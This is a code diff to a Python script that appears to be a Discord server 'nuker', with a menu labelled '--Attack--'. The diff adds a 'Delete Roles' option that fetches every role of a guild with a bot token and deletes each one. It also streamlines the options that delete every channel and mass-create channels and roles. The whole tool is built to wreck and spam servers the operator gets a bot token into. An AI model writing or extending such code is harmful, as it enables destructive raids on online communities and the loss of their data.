@@ -21,7 +21,7 @@ banner="""
 ░░╚██╔╝░░███████╗
 ░░░╚═╝░░░╚══════╝
 """
-version="alpha 1.0 - v2"
+version="alpha 1.6 - v2"
 def printcolor(text):
     print(Colorate.Horizontal(Colors.purple_to_blue,text,1))
 #varivbles importants
@@ -77,7 +77,10 @@ while True:
     print()
     printcolor(version)
     print()
-    printcolor("[1] Create Channels         [2] Delete Channels         [3] Create Roles")
+    printcolor("--Attack--")
+    printcolor("[1] Create Channels         [2] Delete Channels         [3] Create Roles        [4] Delete Roles")
+    print()
+    printcolor("--Server Config--")
     cmd=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
     if cmd=="1":
         #create channels
@@ -103,30 +106,19 @@ while True:
             amountchannels=int(input(Colorate.Horizontal(Colors.purple_to_blue,">",1)))
 
             #action
-            print(channeltype)
             while count<=amountchannels:
                 os.system(f"start src/createchannel.pyw {guildid} {token} {channeltype} {channelname}")
                 printcolor(f"requested to create {channelname}")
                 count=count+1
     elif cmd=="2":
         #delete channels
+        getchannels = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"})
 
-        #get channels ids and delete then
-        guildapichannels = f"https://discord.com/api/v9/guilds/{guildid}/channels"
-        headers = {
-            "Authorization": f"Bot {token}",
-        }
-
-        response = requests.get(guildapichannels, headers=headers)
-
-        if response.status_code == 200:
-            channels = response.json()
+        if getchannels.status_code == 200:
+            channels = getchannels.json()
             for channel in channels:
                 printcolor(f"requested to delete {channel['name']}")
                 os.system(f"start src/deletechannel.pyw {token} {channel['id']}")
-
-        else:
-            print(Colorate.Color(Colors.red,f"Error at search channels: {response.status_code} - {response.text}",1))
     elif cmd=="3":
         printcolor("Name of role:")
         rolename=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
@@ -136,3 +128,10 @@ while True:
             os.system(f"start src/createrole.pyw {guildid} {token} {rolename}")
             printcolor(f"requested to create {rolename}")
             count=count+1
+    elif cmd=="4":
+        rolelist=requests.get(f"https://discord.com/api/v9/guilds/{guildid}/roles",headers={"Authorization": f"Bot {token}"})
+        if rolelist.status_code==200:
+            for role in rolelist.json():
+                os.system(f"start src/deleteroles.pyw {guildid} {token} {role['id']}")
+                printcolor(f"requested to delete {role['name']}")
+                time.sleep(0.3)
